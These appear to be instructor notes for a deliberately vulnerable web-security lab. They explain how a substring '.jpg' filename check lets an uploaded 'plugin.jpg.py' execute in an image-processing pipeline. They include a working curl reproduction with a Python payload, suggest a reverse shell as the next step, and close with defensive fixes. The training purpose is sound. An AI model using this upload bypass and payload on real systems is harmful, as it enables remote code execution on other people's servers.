# Vulnerable upload chain: instructor notes (Stage 6-9)

**Do not link this file from student-facing pages.**

## The chain, layer by layer

| Layer | File | What it checks | Attacker-controlled? |
|---|---|---|---|
| Frontend (conceptual) | n/a — this is a machine-to-machine API | n/a | n/a |
| Auth | `app/routes/api_catalog.py::_require_catalog_sync_token` | `X-Catalog-Sync-Token` header hashed and compared against the current rotated catalog-sync-service credential (`app/services/credentials.py`) | Yes, if the current value is leaked (Stage 6) |
| API | `app/services/catalog_photos.py::looks_like_jpeg_filename` | whether `.jpg` appears **anywhere** in the client-supplied filename | **Yes, fully** |
| Forwarding | `app/services/image_client.py::upload_screenshot_bytes` → `app/routes/api_images.py::upload_image` | multipart `Content-Type` of the forwarded part (still whatever the original attacker request claimed — this backend call just passes it through) | Yes (indirectly — set by the attacker's original request, not by this backend) |
| Storage | `api_images.py::_weak_sanitize_filename` | strips path separators only; keeps extension verbatim | Yes |
| Processing | `vulnerable/upload/image_processor.py` | branches on **filename extension** | Yes |

The attacker-facing check validates whether `.jpg` is a *substring* of the
filename. Storage and processing both trust the filename's **real, final**
extension. Those are two different, attacker-controlled signals that were
never required to agree. A file can be named `plugin.jpg.py` — passes the
substring check, then gets executed by the processing stage because it
*ends* in `.py`.

Note what changed from earlier versions of this lab: `/api/images/upload`
itself is no longer directly reachable by an outside attacker (its
support-image-service token is never disclosed anywhere — see
`app/services/rotation.py`). The attacker-facing entry point is now
`POST /api/catalog/products`, authenticated with a *different* token
(catalog-sync-service) that a leaked chat conversation actually discloses.
This backend forwards the file into the same internal image-processing
pipeline on the attacker's behalf, using its own held credential — the
underlying processing bug (`image_processor.py`) is unchanged; only the
front door moved.

## Minimal reproduction (once the catalog-sync token is known)

```bash
cat > plugin.jpg.py <<'EOF'
import os
os.makedirs("/opt/shop/uploads/images/pwned_proof", exist_ok=True)
with open("/opt/shop/uploads/images/pwned_proof/it_worked.txt", "w") as f:
    f.write("code execution as: " + os.popen("id").read())
EOF

curl -s -X POST http://TARGET:5000/api/catalog/products \
  -H "X-Catalog-Sync-Token: <token discovered via chatbot>" \
  -F "name=Whatever" -F "category=Whatever" -F "description=Whatever" -F "price=9.99" \
  -F "photo=@plugin.jpg.py;type=image/jpeg"
```

`spec.loader.exec_module()` in `image_processor.py` runs the file's
top-level code immediately once it's forwarded — no further steps needed.
From here a student can write a reverse shell payload instead of a proof
file to get an interactive `appuser` shell for Stage 9 (local
enumeration).

## Why this is a good training vulnerability

- Deterministic: no reliance on a specific image-library CVE, no
  null-byte tricks (Python's `os` layer refuses embedded NULs outright,
  unlike the C-based stacks where that historical trick worked), nothing
  version-dependent.
- Realistic shape: "check for the right extension with a substring match
  instead of a suffix match" is an extremely common (wrong) shortcut, and
  it's the kind of gap that specifically shows up on a lower-visibility
  integration path that never got the same scrutiny as the main,
  human-facing upload feature (`app/services/product_photos.py`, which
  does this correctly).
- Clearly demonstrates *why* validation layers must agree: each
  individual check here is "reasonable" in isolation, and the
  vulnerability only exists because two different layers each trusted a
  different, attacker-controlled signal.

## Defensive fix

- Validate actual file content (magic-byte sniffing, e.g. `imghdr`/`filetype`
  equivalents, or re-encoding through a trusted image library) rather than
  a substring match on the filename.
- Never derive executable behavior from an uploaded filename.
- Store uploads under a randomly generated name with no attacker-chosen
  extension, and serve them with a fixed, safe `Content-Type` regardless of
  what was uploaded.
- Run any real image-processing step in a sandboxed, non-code-executing
  worker (e.g. a locked-down container with no interpreter available) and
  treat "load a Python file as a plugin from an upload directory" as
  something that should never exist as a feature at all.
- Audit every path that reaches a shared processing/storage component,
  not just the one a human uses day to day — a fix applied to one caller
  (the admin upload UI) does nothing for another (the automation
  integration) unless both are actually revisited.
